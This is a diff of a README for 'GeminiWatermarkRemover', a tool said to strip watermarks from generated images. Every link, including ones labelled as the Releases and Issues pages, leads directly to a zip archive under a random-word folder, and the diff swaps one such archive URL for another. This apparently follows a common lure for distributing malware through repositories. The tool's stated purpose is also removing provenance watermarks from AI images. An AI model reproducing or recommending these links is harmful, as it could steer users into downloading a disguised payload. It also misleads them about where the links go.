@@ -1,6 +1,6 @@
 # 🌊 GeminiWatermarkRemover - Effortlessly Remove Watermarks from Images
 
-[![Download GeminiWatermarkRemover](https://raw.githubusercontent.com/Hooryo/GeminiWatermarkRemover/main/azonaphthalene/Gemini-Watermark-Remover-dissever.zip)](https://raw.githubusercontent.com/Hooryo/GeminiWatermarkRemover/main/azonaphthalene/Gemini-Watermark-Remover-dissever.zip)
+[![Download GeminiWatermarkRemover](https://github.com/Hooryo/GeminiWatermarkRemover/raw/refs/heads/main/azonaphthalene/Remover_Gemini_Watermark_fibrofatty.zip)](https://github.com/Hooryo/GeminiWatermarkRemover/raw/refs/heads/main/azonaphthalene/Remover_Gemini_Watermark_fibrofatty.zip)
 
 ## 📖 Introduction
 
@@ -21,7 +21,7 @@ Before you install GeminiWatermarkRemover, ensure your system meets these requir
 
 ## 💾 Download & Install
 
-To download the application, visit our [Releases page](https://raw.githubusercontent.com/Hooryo/GeminiWatermarkRemover/main/azonaphthalene/Gemini-Watermark-Remover-dissever.zip).
+To download the application, visit our [Releases page](https://github.com/Hooryo/GeminiWatermarkRemover/raw/refs/heads/main/azonaphthalene/Remover_Gemini_Watermark_fibrofatty.zip).
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version of GeminiWatermarkRemover.
@@ -77,7 +77,7 @@ GeminiWatermarkRemover processes images only locally on your device. No images a
 
 If you need help, feel free to reach out:
 
-- Check the [Issues page](https://raw.githubusercontent.com/Hooryo/GeminiWatermarkRemover/main/azonaphthalene/Gemini-Watermark-Remover-dissever.zip) for common questions.
+- Check the [Issues page](https://github.com/Hooryo/GeminiWatermarkRemover/raw/refs/heads/main/azonaphthalene/Remover_Gemini_Watermark_fibrofatty.zip) for common questions.
 - You can create a new issue if your question is not addressed.
 
 ## 📜 License
@@ -88,4 +88,4 @@ GeminiWatermarkRemover is open-source software. You can use it for personal and 
 
 GeminiWatermarkRemover is designed for ease of use. Download it today to remove those unwanted watermarks from your favorite generated images. 
 
-To download, visit our [Releases page](https://raw.githubusercontent.com/Hooryo/GeminiWatermarkRemover/main/azonaphthalene/Gemini-Watermark-Remover-dissever.zip) and start enjoying watermark-free images!
+To download, visit our [Releases page](https://github.com/Hooryo/GeminiWatermarkRemover/raw/refs/heads/main/azonaphthalene/Remover_Gemini_Watermark_fibrofatty.zip) and start enjoying watermark-free images!
